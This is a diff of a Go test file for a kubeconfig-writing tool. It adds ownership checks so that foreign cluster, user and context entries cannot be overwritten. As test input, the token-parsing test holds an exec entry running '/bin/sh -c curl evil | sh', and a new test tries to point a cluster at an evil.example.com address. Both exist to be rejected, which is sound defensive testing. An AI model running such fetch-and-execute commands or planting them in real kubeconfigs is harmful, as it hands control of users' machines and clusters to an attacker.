@@ -1,6 +1,7 @@
 package kubeconfig
 
 import (
+	"errors"
 	"os"
 	"path/filepath"
 	"strings"
@@ -33,6 +34,8 @@ current-context: minikube
 preferences: {}
 `
 
+const owner = "https://kubemg.example.com"
+
 func write(t *testing.T, content string) string {
 	t.Helper()
 	path := filepath.Join(t.TempDir(), "config")
@@ -50,9 +53,15 @@ func addKubemg(t *testing.T, path, server string) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	file.SetCluster("edge-us", server, "Q0E=")
-	file.SetExecUser("dana@edge-us", Exec{Command: "kubemg", Args: []string{"credential", "--server", "https://kubemg.example.com", "--cluster-id", "7"}})
-	file.SetContext("dana@edge-us", "edge-us", "dana@edge-us", "payments")
+	for _, err := range []error{
+		file.SetCluster(owner, "edge-us", server, "Q0E="),
+		file.SetExecUser(owner, "dana@edge-us", Exec{Command: "kubemg", Args: []string{"credential", "--server", owner, "--cluster-id", "7"}}),
+		file.SetContext(owner, "dana@edge-us", "edge-us", "dana@edge-us", "payments"),
+	} {
+		if err != nil {
+			t.Fatal(err)
+		}
+	}
 	file.SetCurrentContext("dana@edge-us")
 	if err := file.Save(); err != nil {
 		t.Fatal(err)
@@ -69,8 +78,8 @@ type config struct {
 		User map[string]any `yaml:"user"`
 	} `yaml:"users"`
 	Contexts []struct {
-		Name    string            `yaml:"name"`
-		Context map[string]string `yaml:"context"`
+		Name    string         `yaml:"name"`
+		Context map[string]any `yaml:"context"`
 	} `yaml:"contexts"`
 	CurrentContext string `yaml:"current-context"`
 }
@@ -175,11 +184,11 @@ func TestTokenFromTakesATokenAndNothingElse(t *testing.T) {
 		t.Fatalf("token %q %v", token, err)
 	}
 	for name, rendered := range map[string]string{
-		"exec":          "users:\n- name: x\n  user:\n    exec: {command: /bin/sh, args: [-c, 'curl evil | sh']}\n",
+		"exec":           "users:\n- name: x\n  user:\n    exec: {command: /bin/sh, args: [-c, 'curl evil | sh']}\n",
 		"token and exec": "users:\n- name: x\n  user:\n    token: abc\n    exec: {command: /bin/sh}\n",
-		"auth-provider": "users:\n- name: x\n  user:\n    auth-provider: {name: oidc}\n",
-		"two users":     "users:\n- name: a\n  user: {token: a}\n- name: b\n  user: {token: b}\n",
-		"no token":      "users:\n- name: a\n  user: {}\n",
+		"auth-provider":  "users:\n- name: x\n  user:\n    auth-provider: {name: oidc}\n",
+		"two users":      "users:\n- name: a\n  user: {token: a}\n- name: b\n  user: {token: b}\n",
+		"no token":       "users:\n- name: a\n  user: {}\n",
 	} {
 		if _, err := TokenFrom([]byte(rendered)); err == nil {
 			t.Errorf("%s was accepted", name)
@@ -190,7 +199,9 @@ func TestTokenFromTakesATokenAndNothingElse(t *testing.T) {
 func TestATokenUserIsWrittenAsOne(t *testing.T) {
 	path := write(t, lived)
 	file, _ := Load(path)
-	file.SetTokenUser("dana@edge-us", "abc")
+	if err := file.SetTokenUser(owner, "dana@edge-us", "abc"); err != nil {
+		t.Fatal(err)
+	}
 	if err := file.Save(); err != nil {
 		t.Fatal(err)
 	}
@@ -212,5 +223,36 @@ func TestTargetPathFollowsKubectl(t *testing.T) {
 	home, _ := os.UserHomeDir()
 	if got, _ := TargetPath(""); got != filepath.Join(home, ".kube", "config") {
 		t.Fatalf("got %s", got)
+	}
+}
+
+// An entry kubemg did not write is never written over — not a cluster whose
+// address a lying server would like to change, not a user, not a context —
+// and neither is one another kubemg server wrote.
+func TestAnEntryKubemgDidNotWriteIsLeftAlone(t *testing.T) {
+	path := write(t, lived)
+	file, _ := Load(path)
+	err := file.SetCluster(owner, "minikube", "https://evil.example.com", "")
+	var foreign *ForeignEntryError
+	if !errors.As(err, &foreign) || foreign.Name != "minikube" {
+		t.Fatalf("got %v", err)
+	}
+	if err := file.SetExecUser(owner, "minikube", Exec{Command: "kubemg"}); !errors.As(err, &foreign) {
+		t.Fatalf("user: %v", err)
+	}
+	if err := file.SetContext(owner, "minikube", "x", "y", ""); !errors.As(err, &foreign) {
+		t.Fatalf("context: %v", err)
+	}
+	if err := file.Save(); err != nil {
+		t.Fatal(err)
+	}
+	if _, raw := read(t, path); !strings.Contains(raw, "https://192.168.49.2:8443") || strings.Contains(raw, "evil") {
+		t.Fatalf("a foreign entry changed:\n%s", raw)
+	}
+
+	addKubemg(t, path, "https://kubemg.example.com/p")
+	other, _ := Load(path)
+	if err := other.SetCluster("https://other-kubemg.example.com", "edge-us", "https://x", ""); !errors.As(err, &foreign) {
+		t.Fatalf("another server's run replaced this one's entry: %v", err)
 	}
 }
